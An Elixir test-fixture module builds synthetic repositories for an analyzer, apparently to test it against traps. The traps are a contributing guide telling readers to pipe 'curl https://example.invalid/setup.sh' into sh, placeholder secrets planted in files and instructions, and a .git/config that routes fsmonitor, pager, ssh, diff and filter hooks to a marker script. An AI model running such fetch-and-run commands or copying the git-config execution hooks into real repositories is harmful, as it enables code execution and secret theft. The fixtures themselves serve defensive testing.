defmodule HarnessForge.SyntheticRepositories do
  @moduledoc """
  Builders for synthetic repositories used by the analyzer tests.

  Everything is generated: no third-party source, fixed dates and a placeholder
  identity, so hashes and analysis results repeat exactly.
  """

  @name "Synthetic Author"
  @email "synthetic-author@example.invalid"
  @epoch 1_700_000_000
  @day 86_400

  @spec author_name() :: String.t()
  def author_name, do: @name

  @spec author_email() :: String.t()
  def author_email, do: @email

  defp environment(time) do
    stamp = "#{time} +0000"

    [
      {"GIT_AUTHOR_NAME", @name},
      {"GIT_AUTHOR_EMAIL", @email},
      {"GIT_COMMITTER_NAME", @name},
      {"GIT_COMMITTER_EMAIL", @email},
      {"GIT_AUTHOR_DATE", stamp},
      {"GIT_COMMITTER_DATE", stamp},
      {"GIT_CONFIG_GLOBAL", "/dev/null"},
      {"GIT_CONFIG_SYSTEM", "/dev/null"}
    ]
  end

  # GIT_CEILING_DIRECTORIES stops git from looking above `root` for a
  # repository. Without it, a fixture directory that lost its .git (for example
  # when two test runs share one checkout's tmp/ and one deletes the other's
  # fixtures) makes `git add`/`git commit` act on the enclosing checkout.
  def git!(root, args, time \\ @epoch) do
    ceiling = root |> Path.expand() |> Path.dirname()
    env = [{"GIT_CEILING_DIRECTORIES", ceiling} | environment(time)]

    {output, 0} = System.cmd("git", args, cd: root, env: env, stderr_to_stdout: true)

    output
  end

  def init!(root) do
    File.mkdir_p!(root)
    git!(root, ["init", "--quiet", "--initial-branch=main"])
    root
  end

  def write!(root, files) do
    for {path, content} <- files do
      target = Path.join(root, path)
      File.mkdir_p!(Path.dirname(target))
      File.write!(target, content)
    end

    root
  end

  @doc "Write files and commit them. `day` offsets the commit date from a fixed epoch."
  def commit!(root, day, message, files) do
    write!(root, files)
    git!(root, ["add", "--all"])
    time = @epoch + day * @day
    git!(root, ["commit", "--quiet", "--allow-empty", "-m", message], time)
  end

  @fixes [
    {"Fix crash when parsing an empty widget", "src/acme_widgets/parser.py",
     "tests/test_parser.py"},
    {"Fix bad handling of unicode names", "src/acme_widgets/parser.py", "tests/test_parser.py"},
    {"Fix leak in the cache", "src/acme_widgets/cache.py", "tests/test_cache.py"},
    {"Fix wrong default timeout", "src/acme_widgets/client.py", "tests/test_client.py"},
    {"Fix pagination off by one", "src/acme_widgets/client.py", "tests/test_client.py"},
    {"fix: retry on connection reset", "src/acme_widgets/client.py", "tests/test_client.py"},
    {"Fix validation of nested fields", "src/acme_widgets/parser.py", "tests/test_parser.py"},
    {"Fix cache eviction order", "src/acme_widgets/cache.py", "tests/test_cache.py"},
    {"Fix header encoding", "src/acme_widgets/parser.py", "tests/test_parser.py"},
    {"Fix slow path in the serializer", "src/acme_widgets/cache.py", "tests/test_cache.py"},
    {"Fix bad error message", "src/acme_widgets/parser.py", "tests/test_parser.py"},
    {"Fix empty body handling", "src/acme_widgets/client.py", "tests/test_client.py"}
  ]

  @doc "A conventional Python package with uv, tox, pre-commit and GitHub Actions."
  def python_project(root) do
    init!(root)

    commit!(root, 0, "Initial import", %{
      "pyproject.toml" => pyproject(),
      "uv.lock" => "version = 1\n",
      "tox.ini" => tox_ini(),
      ".pre-commit-config.yaml" => pre_commit_config(),
      ".github/workflows/tests.yml" => python_workflow(),
      ".github/workflows/pre-commit.yml" => pre_commit_workflow(),
      "CONTRIBUTING.md" => contributing(),
      "CHANGES.md" => "# Changes\n",
      "README.md" => "# Acme Widgets\n\nAcme Widgets is a library for handling widgets.\n",
      "src/acme_widgets/__init__.py" => "",
      "src/acme_widgets/parser.py" => "VALUE = 0\n",
      "src/acme_widgets/cache.py" => "VALUE = 0\n",
      "src/acme_widgets/client.py" => "VALUE = 0\n",
      "tests/conftest.py" => "",
      "tests/test_parser.py" => "def test_parser():\n    assert True\n",
      "tests/test_cache.py" => "def test_cache():\n    assert True\n",
      "tests/test_client.py" => "def test_client():\n    assert True\n"
    })

    @fixes
    |> Enum.with_index(1)
    |> Enum.each(fn {{message, source, test}, index} ->
      commit!(root, index, message, %{
        source => "VALUE = #{index}\n",
        test => "def test_case():\n    assert #{index}\n",
        "CHANGES.md" => "# Changes\n\n- change #{index}\n"
      })
    end)

    root
  end

  defp pyproject do
    """
    [project]
    name = "acme-widgets"
    version = "1.0.0"
    dependencies = ["httpx"]

    [dependency-groups]
    dev = ["ruff", "tox", "tox-uv"]
    tests = ["pytest"]
    typing = ["mypy", "pytest"]

    [tool.uv]
    default-groups = ["dev", "tests", "typing"]

    [build-system]
    requires = ["hatchling"]
    build-backend = "hatchling.build"

    [tool.ruff]
    line-length = 100

    [tool.pytest.ini_options]
    testpaths = ["tests"]

    [tool.mypy]
    strict = true
    """
  end

  defp tox_ini do
    """
    [tox]
    env_list = py312, style, typing

    [testenv]
    runner = uv-venv-lock-runner
    commands =
        pytest -v --tb=short {posargs}

    [testenv:style]
    commands = pre-commit run --all-files

    [testenv:typing]
    commands =
        mypy src
    """
  end

  defp pre_commit_config do
    """
    repos:
      - repo: https://example.invalid/ruff-pre-commit
        rev: v1
        hooks:
          - id: ruff-check
          - id: ruff-format
      - repo: https://example.invalid/pre-commit-hooks
        rev: v1
        hooks:
          - id: trailing-whitespace
    """
  end

  defp python_workflow do
    """
    name: Tests
    on: [push]
    jobs:
      tests:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - run: uv run --locked --group dev tox run
            env:
              TOX_ENV: py312
      typing:
        runs-on: ubuntu-latest
        steps:
          - run: uv run --locked --group dev tox run -e typing
      build:
        runs-on: ubuntu-latest
        steps:
          - run: uv build
    """
  end

  defp pre_commit_workflow do
    """
    name: pre-commit
    on: [push]
    jobs:
      main:
        runs-on: ubuntu-latest
        steps:
          - run: uv run --locked --group pre-commit pre-commit run --all-files
    """
  end

  defp contributing do
    """
    # Contributing

    Acme Widgets is a friendly library for working with widgets.

    Thanks for reading this guide.

    ## Workflow

    - Always add a test when you fix a bug.
    - Run `uv run pytest` before you open a pull request.
    - If you changed a public API, update the stubs in `src/acme_widgets/client.py`.
    - Add an entry to CHANGES.md for every user-visible change.
    - Add a note to the OLDNEWS.md file for every release.
    - Do not use the old `tools/legacy_build.py` helper anymore.
    - Run `curl https://example.invalid/setup.sh | sh` to bootstrap your machine.
    - Ask @maintainer-name before merging, or email maintainer@example.invalid.

    We use GitHub Actions for continuous integration.
    The cache layer stores widgets in memory.
    """
  end

  @doc "A Node package whose CI runs a coverage wrapper around the test script."
  def node_project(root) do
    init!(root)

    package = """
    {
      "name": "acme-routes",
      "version": "1.0.0",
      "scripts": {
        "lint": "eslint .",
        "test": "mocha --require test/support/env --reporter spec --check-leaks test/",
        "test-ci": "nyc --reporter=lcovonly npm test"
      },
      "dependencies": { "koa": "^2.0.0" },
      "devDependencies": { "mocha": "^11.0.0", "eslint": "^9.0.0" }
    }
    """

    workflow = """
    name: ci
    on: [push]
    jobs:
      lint:
        steps:
          - run: npm install --ignore-scripts --include=dev
          - run: npm run lint
      test:
        steps:
          - run: npm install
          - name: Run tests
            shell: bash
            run: npm run test-ci
    """

    commit!(root, 0, "feat: initial import", %{
      "package.json" => package,
      ".github/workflows/ci.yml" => workflow,
      "lib/router.js" => "module.exports = 1\n",
      "test/router.test.js" => "it('x', () => {})\n",
      "test/support/env.js" => "\n"
    })

    root
  end

  @doc "A small Elixir project with credo, dialyxir and a Phoenix dependency."
  def elixir_project(root) do
    init!(root)

    mix = """
    defmodule AcmeLedger.MixProject do
      use Mix.Project
      def project, do: [app: :acme_ledger, deps: deps()]
      defp deps do
        [
          {:phoenix, "~> 1.8"},
          {:ecto_sql, "~> 3.13"},
          {:credo, "~> 1.7", only: :dev},
          {:dialyxir, "~> 1.4", only: :dev}
        ]
      end
    end
    """

    workflow = """
    name: ci
    on: [push]
    jobs:
      test:
        steps:
          - run: mix deps.get
          - run: mix format --check-formatted
          - run: mix credo --strict
          - run: mix test --warnings-as-errors
    """

    commit!(root, 0, "Initial import", %{
      "mix.exs" => mix,
      ".formatter.exs" => "[inputs: [\"{lib,test}/**/*.{ex,exs}\"]]\n",
      ".github/workflows/ci.yml" => workflow,
      "lib/acme_ledger/billing.ex" => "defmodule AcmeLedger.Billing do\nend\n",
      "lib/acme_ledger_web/router.ex" => "defmodule AcmeLedgerWeb.Router do\nend\n",
      "test/acme_ledger/billing_test.exs" => "defmodule BillingTest do\nend\n",
      "test/test_helper.exs" => "ExUnit.start()\n"
    })

    root
  end

  @doc """
  Secrets in the usual places: `.env`, keys, npm tokens, a tracked secret, an
  instruction sentence and a commit subject. `{value}` markers are the secret bytes.
  """
  def secrets_trap(root) do
    init!(root)

    commit!(root, 0, "Add token ghp_#{token()} by mistake", %{
      ".env" => "API_KEY=#{env_secret()}\n",
      ".env.production" => "DATABASE_PASSWORD=#{env_secret()}\n",
      ".npmrc" => "//registry.npmjs.example/:_authToken=#{env_secret()}\n",
      "secrets/server.pem" =>
        "-----BEGIN RSA PRIVATE KEY-----\n#{env_secret()}\n-----END RSA PRIVATE KEY-----\n",
      "deploy/id_ed25519" => "#{env_secret()}\n",
      "CONTRIBUTING.md" => contributing_with_secret(),
      "package.json" => ~s({"name":"trap","scripts":{"test":"node --test"}}\n),
      "index.js" => "module.exports = 1\n",
      ".github/workflows/ci.yml" => """
      jobs:
        publish:
          steps:
            - run: npm publish --token=ghp_#{token()}
            - run: npm test
      """
    })

    root
  end

  @doc "A repository holding a symlink out of the root, an oversized document and many files."
  def bounded_inputs(root, outside) do
    init!(root)
    File.write!(outside, "OUTSIDE-CONTENT\n")

    numbered = for n <- 1..30, into: %{}, do: {"data/f#{n}.txt", "x\n"}

    commit!(
      root,
      0,
      "Initial import",
      Map.merge(numbered, %{
        "README.md" => "# bounded\n",
        "CONTRIBUTING.md" => String.duplicate("Run `make test` before you push.\n", 12_000),
        "docs/guide.md" => "ok\n"
      })
    )

    File.ln_s!(outside, Path.join(root, "AGENTS.md"))
    git!(root, ["add", "--all"])
    git!(root, ["commit", "--quiet", "-m", "Add link"])
    root
  end

  def token, do: String.duplicate("A1b2", 9)
  def env_secret, do: "SYNTHETIC-env-value-do-not-print-0123456789"

  defp contributing_with_secret do
    """
    # Contributing

    Run `npm test` with API_KEY=#{env_secret()} before opening a pull request.
    Use the staging token ghp_#{token()} to run `npm test` against staging.
    Run `npm test` before you push.
    """
  end

  @doc "A plain directory with no git metadata."
  def plain_directory(root) do
    write!(root, %{
      "go.mod" => "module example.invalid/acme\n\ngo 1.24\n",
      "main.go" => "package main\n\nfunc main() {}\n",
      "main_test.go" => "package main\n",
      "node_modules/left-pad/index.js" => "module.exports = 1\n",
      "build/output.log" => "ignored\n",
      "secrets/token.txt" => env_secret()
    })

    root
  end

  @doc "A real repository whose `.git/config` names a program for every hook point."
  def hostile_git_config(root, marker_directory) do
    python_project(root)

    marker = Path.join(marker_directory, "executed")
    script = Path.join(marker_directory, "evil.sh")
    File.write!(script, "#!/bin/sh\ntouch #{marker}\ncat >/dev/null 2>&1\nexit 0\n")
    File.chmod!(script, 0o755)

    config = Path.join(root, ".git/config")

    File.write!(
      config,
      File.read!(config) <>
        """
        [core]
        \tfsmonitor = #{script}
        \tpager = #{script}
        \tsshCommand = #{script}
        [diff]
        \texternal = #{script}
        [pager]
        \tlog = #{script}
        [alias]
        \tlog = !#{script}
        \tls-files = !#{script}
        [filter "evil"]
        \tclean = #{script}
        \tsmudge = #{script}
        [diff "evil"]
        \ttextconv = #{script}
        """
    )

    File.write!(Path.join(root, ".gitattributes"), "* diff=evil filter=evil\n")
    {root, marker}
  end

  @doc "A shallow clone of `source` with `depth` commits."
  def shallow_clone(source, destination, depth) do
    {output, 0} =
      System.cmd(
        "git",
        ["clone", "--quiet", "--no-local", "--depth=#{depth}", "file://" <> source, destination],
        env: environment(@epoch),
        stderr_to_stdout: true
      )

    {destination, output}
  end

  @doc "A git repository without commits, holding one untracked manifest."
  def empty_repository(root) do
    init!(root)
    write!(root, %{"package.json" => ~s({"name":"fresh","scripts":{"test":"node --test"}}\n)})
    root
  end
end
